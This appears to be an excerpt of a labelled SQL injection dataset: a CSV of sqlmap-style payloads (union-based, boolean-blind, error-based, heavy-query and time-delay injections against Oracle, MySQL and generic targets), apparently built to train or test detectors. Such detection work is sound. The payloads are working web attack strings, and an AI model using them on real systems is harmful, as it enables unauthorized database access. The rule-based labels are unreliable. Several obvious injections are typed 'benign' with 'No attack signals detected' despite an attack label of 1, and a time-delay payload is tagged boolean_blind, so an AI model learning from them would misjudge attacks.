row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2160,"-8429' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'bwih' like 'bwih",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
2161,"1'|| ( select 'rask' from dual where 9411 = 9411 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",1,,error_based,oracle,0.95,convert ( int detected — error_based injection (priority 4) on oracle,rule-based
2162,"1%"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2163,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""pxbk"" like ""pxbk",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2164,1' ) where 5871 = 5871,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2165,1'+ ( select 'rsgi' where 2258 = 2258,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2166,"1'|| ( select 'xyft' from dual where 8250 = 8250 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",1,,heavy_query,oracle,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on oracle",rule-based
2167,-4785' or ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2168,"-9318"" ) ) ) union all select 5223,5223,5223,5223#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2169,1%' ) and ( 7704 = 3494 ) *3494 and ( '%' = ',1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
2170,1' ) where 9175 = 9175,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2171,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""staz"" like ""staz",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
2172,1'+ ( select 'lpkv' where 8760 = 8760,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2173,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2174,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2175,"1'|| ( select 'uqbj' from dual where 6736 = 6736 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,oracle,0.95,6736 = 6736 or detected — boolean_blind injection (priority 8) on oracle,rule-based
2176,"-6370' ) ) as sims where 9388 = 9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2177,"-9076'+ ( select lqvj where 8551 = 8551 union all select 8551,8551,8551,8551--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2178,-8341 or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
